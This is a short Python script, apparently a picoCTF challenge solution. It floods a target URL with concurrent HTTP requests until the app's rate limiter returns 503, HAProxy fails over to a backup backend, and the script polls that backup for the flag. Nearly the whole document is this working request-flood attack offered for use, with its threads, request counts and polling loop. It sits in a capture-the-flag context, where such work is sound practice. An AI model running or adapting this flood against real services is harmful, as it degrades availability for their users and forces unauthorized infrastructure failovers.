#!/usr/bin/env python3
"""Force a load-balancer failover by tripping the active backend's health check.

The classic trigger: an app-side rate limiter that returns 503 once flooded.
HAProxy then marks the backend DOWN and fails over to the backup server,
which may serve the flag. Stdlib only (no requests).

Usage:
    python failover_flood.py <base_url> [threads] [requests_per_thread] [poll_seconds]

Example:
    python failover_flood.py http://host/ 40 15 60
"""
import collections
import concurrent.futures
import re
import sys
import time
import urllib.error
import urllib.request

FLAG_RE = re.compile(r"picoCTF\{[^}]+\}")


def request_once(base):
    try:
        resp = urllib.request.urlopen(base + "/", timeout=15)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return "ERR", str(e)


def flood(base, threads, per):
    statuses = collections.Counter()
    hits = []

    def worker(_):
        return request_once(base)

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(worker, i) for i in range(threads * per)]
        for fut in concurrent.futures.as_completed(futures):
            st, body = fut.result()
            statuses[st] += 1
            m = FLAG_RE.search(body)
            if m and m.group(0) not in hits:
                hits.append(m.group(0))
    return statuses, hits


def poll(base, seconds):
    for i in range(int(seconds)):
        st, body = request_once(base)
        m = FLAG_RE.search(body)
        if "No flag" in body:
            marker = "PRIMARY (no flag)"
        elif st == 503 or "rate limit" in body.lower():
            marker = "503/ratelimit"
        elif m:
            marker = "BACKUP: " + m.group(0)
        else:
            marker = body[:40]
        print(f"    poll {i}: status={st} -> {marker}", flush=True)
        if m:
            print("FLAG:", m.group(0))
            return True
        time.sleep(1.5)
    return False


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    base = sys.argv[1].rstrip("/")
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 40
    per = int(sys.argv[3]) if len(sys.argv) > 3 else 15
    poll_seconds = int(sys.argv[4]) if len(sys.argv) > 4 else 60

    print(f"[*] flooding {threads}x{per} against {base}")
    statuses, hits = flood(base, threads, per)
    print("[*] flood statuses:", dict(statuses))
    print("[*] flags seen during flood:", hits)

    print("[*] polling for failover...")
    poll(base, poll_seconds)


if __name__ == "__main__":
    main()
